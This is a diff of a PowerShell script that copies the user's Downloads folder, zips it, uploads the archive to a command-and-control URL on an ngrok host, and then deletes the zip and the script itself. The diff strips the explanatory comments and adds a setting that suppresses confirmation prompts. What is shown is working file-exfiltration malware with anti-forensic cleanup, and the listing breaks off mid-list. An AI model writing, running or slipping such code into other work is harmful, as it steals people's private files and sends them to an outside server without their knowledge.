@@ -1,25 +1,23 @@
-# Define paths and server URL
+
 $currentUser = [Environment]::UserName
 $sourcePath = "C:\Users\$currentUser\Downloads"
 $destinationPath = "C:\Users\$currentUser\$currentUser"
 $zipFilePath = "C:\Users\$currentUser\$currentUser.zip"
 $c2ServerUrl = "https://charmed-strictly-ringtail.ngrok-free.app/upload"
 
-# Create a new folder in C:\Users\ with the current user's name and copy all files from Downloads
+$ConfirmPreference = 'None'
+
 New-Item -ItemType Directory -Force -Path $destinationPath
 Get-ChildItem -Path $sourcePath | Copy-Item -Destination $destinationPath -Recurse
 
-# Compress the new folder into a ZIP file
 Compress-Archive -Path "$destinationPath\*" -DestinationPath $zipFilePath -Force
 
-# Prepare the multipart/form-data request
 $boundary = [System.Guid]::NewGuid().ToString()
 $LF = "`r`n"
 $encoding = [System.Text.Encoding]::UTF8
 $multipartContentType = "multipart/form-data; boundary=$boundary"
 $contentDisposition = "form-data; name=`"file`"; filename=`"$($zipFilePath | Split-Path -Leaf)`""
 
-# Build the request body with file content directly
 $bodyLines = @(
     "--$boundary",
     "Content-Disposition: $contentDisposition",
@@ -28,7 +26,6 @@ $bodyLines = @(
     "--$boundary--"
 )
 
-# Convert the body to a byte array
 $body = New-Object System.IO.MemoryStream
 $writer = New-Object System.IO.BinaryWriter $body
 foreach ($line in $bodyLines) {
@@ -44,10 +41,8 @@ $bodyBytes = $body.ToArray()
 $body.Dispose()
 $writer.Dispose()
 
-# Create the WebClient object
 $webClient = New-Object System.Net.WebClient
 
-# Add the multipart/form-data content type header
 $webClient.Headers.Add("Content-Type", $multipartContentType)
 
 try {
@@ -62,7 +57,6 @@ finally {
     $webClient.Dispose()
 }
 
-# Define the paths of the files to be deleted
 $filesToDelete = @(
     "$zipFilePath",
     "C:\Users\$currentUser\script.ps1",
